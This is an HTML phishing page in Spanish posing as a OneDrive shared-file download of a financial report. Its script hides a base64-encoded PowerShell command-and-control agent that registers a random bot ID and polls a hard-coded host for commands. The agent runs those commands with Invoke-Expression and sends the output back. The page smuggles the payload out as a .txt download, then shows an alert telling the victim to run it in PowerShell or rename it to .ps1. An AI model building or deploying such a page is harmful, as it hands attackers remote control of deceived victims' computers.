<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Documento Compartido - OneDrive</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; }
        .header { background: #0078d4; color: white; padding: 15px 30px; display: flex; align-items: center; gap: 10px; }
        .container { max-width: 800px; margin: 40px auto; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); padding: 40px; }
        .file-card { border: 1px solid #e1e4e8; border-radius: 6px; padding: 20px; display: flex; align-items: center; gap: 15px; margin: 20px 0; }
        .file-icon { width: 48px; height: 48px; background: #0078d4; border-radius: 4px; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; }
        .btn { background: #0078d4; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; }
        .btn:hover { background: #005a9e; }
        .info { color: #666; font-size: 13px; margin-top: 5px; }
        #status { margin-top: 20px; padding: 15px; border-radius: 4px; display: none; }
        .loading { color: #0078d4; }
        .success { background: #d4edda; color: #155724; }
    </style>
</head>
<body>
    <div class="header">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        <span>OneDrive - Documentos Compartidos</span>
    </div>
    
    <div class="container">
        <h2>📄 Documento compartido contigo</h2>
        <p>Alguien ha compartido un documento contigo. Haz clic en descargar para verlo.</p>
        
        <div class="file-card">
            <div class="file-icon">📊</div>
            <div>
                <div style="font-weight: 600;">Reporte_Financiero_Q3_2026.xlsx</div>
                <div class="info">2.4 MB • Modificado hace 2 horas</div>
            </div>
            <button class="btn" onclick="downloadFile()">Descargar</button>
        </div>
        
        <div id="status"></div>
        
        <div class="info" style="margin-top: 30px;">
            <p>🔒 Este enlace expira en 7 días. El documento está protegido por Microsoft Information Protection.</p>
        </div>
    </div>

<script>
// HTML SMUGGLING - El payload está codificado en base64 dentro del HTML
// El navegador decodifica y descarga, NUNCA toca el servidor como archivo .ps1

const PAYLOAD_B64 = "JABJAFAAIAA9ACAAIgAxADkAMgAuADEANgA4AC4AMQAuADEANAAiAA0ACgAkAFAAbwByAHQAIAA9ACAAIgA4ADAAMAAwACIADQAKACQAQgBvAHQASQBEACA9ACAALQBqAG8AaQBuACAAKAAoADQAOAAuAC4ANQA3ACkAIAArACAAKAA5ADcALgAuADEAMAAyACkAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAMAAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7AFsAYwBoAGEAcgBdACQAXwB9ACkADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABJAG4AdgBvAGsAZQAtAE0AZQBtAG8AcgB5AFMAaABlAGwAbAAgewANAAoAIAAgACAAIAAkAGIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABQAGEAeQBsAG8AYQBkAEIANgA0ACkADQAKACAAIAAgACAAJABhAHMAcwBlAG0AYgBsAHkAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACQAYgB5AHQAZQBzACkADQAKACAAIAAgACAAJABlAG4AdAByAHkAIAA9ACAAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAIgBTAABhAGQAbwB3AEMAMgAuAEIAbwB0ACIAKQAuAEcAZQB0AE0AZQB0AGgAbwBkACgAIgBNAGEAaQBuACIAKQANAAoAIAAgACAAIAAkAGUAbgB0AHIAeQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAIABAAHsAIABJAFAAIAA9ACAAJABJADsAIABQAG8AcgB0ACAAPQAgACQAUABvAHIAdAAgAH0AKQANAAoAfQANAAoADQAKACMAIABDAG8AbgB0AGkAbgB1AG8AIABkAGUAbAAgAHMAYwByAGkAcAB0ACAAbwByAGkAZwBpAG4AYQBsAA0ACgB3AGgAaQBsAGUAKAAkAHQAcgB1AGUpAHsADQAKACAAIAAgACAAdAByAHkAewANAAoAIAAgACAAIAAgACAAIAAgACQAYwBtAGQAcwAgAD0AIABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAIgBoAHQAdABwADoALwAvACQASQBQADoAJABQAG8AcgB0AC8AYwAyAC8AYwBsAGUAYQByAC8AYwBoAGUAYwBrAC8AJABCAE8AVABJAEQAIgAgAC0ATQBlAHQAaABvAGQAIABHAEUAVAANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAKAAkAGMAbQBkACAAaQBuACAAJABjAG0AZABzAC4AYwBvAG0AbQBhAG4AZABzACkAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGMAbQBkAC4AYwBvAG0AbQBhAG4AZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABiAG8AZAB5ACAAPQAgAEAAewAgAGMAbQBkAF8AaQBkAD0AJABjAG0AZAAuAGMAbQBkAF8AaQBkADsAIAByAGUAcwB1AGwAdAA9ACQAbwB1AHQAcAB1AHQAIAB9ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAkAEkAUAA6ACQAUABvAHIAdAAvAGMAMgAvAGMAbABlAGEAcgAvAHIAZQBzAHUAbAB0AC8AJABCAE8AVABJAEQAIgAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBCAG8AZAB5ACAAJABiAG8AZAB5ACAALQBDAG8AbgB0AGUAbgB0AFQAeQBwAGUAIAAiAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAGoAcwBvAG4AIgANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAxADAADQAKACAAIAAgACAAfQAgAGMAYQB0AGMAaAAgewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA2ADAAfQANAAoAfQ==";

function downloadFile() {
    const status = document.getElementById('status');
    status.style.display = 'block';
    status.className = 'loading';
    status.innerHTML = '⏳ Preparando descarga...';
    
    setTimeout(() => {
        // Decode payload
        const payload = atob(PAYLOAD_B64);
        
        // Create blob with .txt extension first (evades extension check)
        const blob = new Blob([payload], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = 'Reporte_Financiero_Q3_2026.txt'; // .txt para evadir
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        status.className = 'success';
        status.innerHTML = '✅ Descarga completada. Abre el archivo para ver el reporte.';
        
        // Instrucciones para renombrar (social engineering)
        setTimeout(() => {
            alert('⚠️ IMPORTANTE: El archivo se descargó como .txt por seguridad.\n\nPara ver correctamente el reporte:\n1. Haz clic derecho en el archivo descargado\n2. Selecciona "Abrir con" → "PowerShell"\n3. O renombra de .txt a .ps1 y ejecuta');
        }, 1000);
        
    }, 1500);
}
</script>
</body>
</html>
